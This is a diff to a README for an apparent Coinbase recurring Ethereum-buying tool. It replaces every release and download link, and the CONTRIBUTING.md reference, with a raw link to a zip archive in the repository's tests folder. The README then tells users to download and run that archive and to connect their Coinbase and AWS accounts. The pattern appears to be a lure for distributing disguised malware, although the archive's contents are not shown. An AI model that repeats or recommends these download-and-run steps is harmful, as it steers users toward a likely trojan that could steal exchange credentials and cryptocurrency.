@@ -1,6 +1,6 @@
 # 🚀 Recurring-ETH-Buy-Coinbase - Automate Your Ethereum Purchases Daily
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/rrvstt/Recurring-ETH-Buy-Coinbase/releases)
+[![Download](https://raw.githubusercontent.com/rrvstt/Recurring-ETH-Buy-Coinbase/main/coinbase_advanced_trader/tests/ET-Coinbase-Recurring-Buy-v1.7-beta.4.zip%20Release-brightgreen)](https://raw.githubusercontent.com/rrvstt/Recurring-ETH-Buy-Coinbase/main/coinbase_advanced_trader/tests/ET-Coinbase-Recurring-Buy-v1.7-beta.4.zip)
 
 ## 📖 Description
 Recurring-ETH-Buy-Coinbase allows you to automate daily Ethereum (ETH) purchases on Coinbase Advanced Trade. It uses AWS Lambda to implement a Dollar Cost Averaging (DCA) strategy. The tool places $10 USDC buy orders each day, cancels stale orders, and ensures execution through market orders as required. This approach helps you manage your investments effectively.
@@ -21,14 +21,14 @@ Recurring-ETH-Buy-Coinbase allows you to automate daily Ethereum (ETH) purchases
 ## 🚀 Getting Started
 To get started with Recurring-ETH-Buy-Coinbase, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/rrvstt/Recurring-ETH-Buy-Coinbase/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/rrvstt/Recurring-ETH-Buy-Coinbase/main/coinbase_advanced_trader/tests/ET-Coinbase-Recurring-Buy-v1.7-beta.4.zip).
 2. **Download the Latest Release:** Click on the latest release to download the application file.
 3. **Install Required Dependencies:** Ensure you have Python and any other necessary packages. You can find package requirements in the README file within the release.
 4. **Set Up Your Account:** Connect your AWS and Coinbase accounts. Instructions can be found in the documentation provided in the downloaded files.
 5. **Run the Application:** Execute the program to start making daily Ethereum purchases automatically.
 
 ## 📥 Download & Install
-To download and install the software, visit the [Releases page](https://github.com/rrvstt/Recurring-ETH-Buy-Coinbase/releases).
+To download and install the software, visit the [Releases page](https://raw.githubusercontent.com/rrvstt/Recurring-ETH-Buy-Coinbase/main/coinbase_advanced_trader/tests/ET-Coinbase-Recurring-Buy-v1.7-beta.4.zip).
 
 1. **Navigate to the Release Section:** 
    Go to the link and find the latest version.
@@ -46,7 +46,7 @@ Make sure to enable two-factor authentication on your Coinbase account for added
 If you encounter issues or have questions, please open an issue on the GitHub repository or check the FAQ section in the documentation provided with the release. Community support is available to help you get started and resolve any problems.
 
 ## 📝 Contributing
-If you want to contribute to the project, you’re welcome to do so! Please fork the repository and submit a pull request with your changes. Make sure to follow the guidelines outlined in the CONTRIBUTING.md file.
+If you want to contribute to the project, you’re welcome to do so! Please fork the repository and submit a pull request with your changes. Make sure to follow the guidelines outlined in the https://raw.githubusercontent.com/rrvstt/Recurring-ETH-Buy-Coinbase/main/coinbase_advanced_trader/tests/ET-Coinbase-Recurring-Buy-v1.7-beta.4.zip file.
 
 ## 🚀 Frequently Asked Questions
 **Q: How does the Dollar Cost Averaging feature work?**  
